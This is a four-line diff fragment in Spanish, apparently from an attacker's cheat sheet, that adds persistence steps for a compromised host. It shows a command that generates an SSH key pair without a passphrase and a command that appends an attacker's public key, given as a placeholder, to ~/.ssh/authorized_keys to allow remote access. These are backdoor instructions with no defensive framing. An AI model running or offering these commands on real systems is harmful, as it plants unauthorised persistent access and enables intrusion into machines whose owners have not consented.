@@ -1,0 +1,4 @@
+▶ Generar Clave SSH para Persistencia (Crear par de claves):
+  ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
+▶ Añadir Clave Pública para Acceso (Permitir acceso remoto):
+  echo "<clave_pública_atacante>" >> ~/.ssh/authorized_keys
